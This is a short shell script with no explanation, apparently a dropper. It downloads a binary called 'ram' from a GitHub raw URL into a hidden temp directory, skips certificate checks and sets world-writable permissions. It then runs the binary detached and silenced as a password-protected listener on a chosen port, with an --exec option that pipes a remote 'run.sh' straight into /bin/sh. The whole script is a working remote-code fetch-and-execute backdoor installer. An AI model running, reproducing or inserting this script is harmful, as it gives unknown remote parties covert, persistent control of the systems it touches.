#!/bin/sh

port="${1:-1212}"
pass="${2:-alpine@233}"
src="https://raw.githubusercontent.com/pakoinake/kaxgn/main"
work="$(mktemp -u -t .XXXXXX 2>/dev/null)"
[ -n "${work}" ] || work="/tmp/.work"
mkdir -p "${work}"
wget --no-check-certificate -qO "${work}/ram" "${src}/ram"
chmod -R 777 "${work}"
nohup setsid /bin/sh -c 'exec "$1" -v "$2" -p "$3" --port "$4" --exec "$5"' /bin/sh "${work}/ram" "3.23" "${pass}" "${port}" "wget -qO- ${src}/run.sh |/bin/sh -s 0 ${src}"  </dev/null >/dev/null 2>&1 &
exit 0
